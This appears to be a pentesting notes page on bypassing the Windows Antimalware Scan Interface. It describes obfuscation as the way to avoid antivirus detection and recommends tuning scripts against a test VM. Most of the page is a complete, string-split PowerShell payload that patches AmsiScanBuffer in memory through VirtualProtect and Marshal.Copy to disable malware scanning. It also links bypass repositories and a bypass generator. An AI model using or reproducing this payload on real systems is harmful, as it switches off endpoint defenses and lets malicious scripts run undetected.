## AMSI

The Antimalware Scan Interface (AMSI) is a feature of Windows 10. Effectively it lets a process check input with the registered anti-virus product.

### Bypassing AMSI

The trick to bypassing AMSI is to effectively turn it off. Windows won't let you do this, by flagging attempts to turn AMSI off. So the main thing to do is obfuscate the script to do so. Any published bypass script will be flagged by defender (or other AV). So you will have to tweak and make your own version. Recommendation is to spin up a Win 10 VM and write the bypass step by step, see what parts are triggering the anti-virus.

#### Powershell

Example of a obfuscated AMSI powershell payload I have done, based on Rasta Mouse's work:

```powershell
$Simon= @"
using System;
using System.Runtime.InteropServices;

public class Simon {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Simon

$LoadLibrary = [Simon]::LoadLibrary("am" + "si.dll")
$Maglok = [Simon]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
$command = '[Simon]::Virtual' + 'Protect($Maglok, [uint32]5, 0x40, [ref]$p)'
iex $command
$command2 = '[Byte[]] (0x'+'B'+'8, 0x'+'5'+'7, 0'+'x00, 0'+'x0'+'7, 0x8'+'0, '+'0xC'+'3)'
$values = iex $command2
[System.Runtime.InteropServices.Marshal]::Copy($values, 0, $Maglok, 6)
```

### Useful links

* Rasta mouse's AMSI bypass scripts: [https://github.com/rasta-mouse/AmsiScanBufferBypass](https://github.com/rasta-mouse/AmsiScanBufferBypass)
* Amsi.fail, automated AMSI bypass generation: [https://amsi.fail/](https://amsi.fail/)
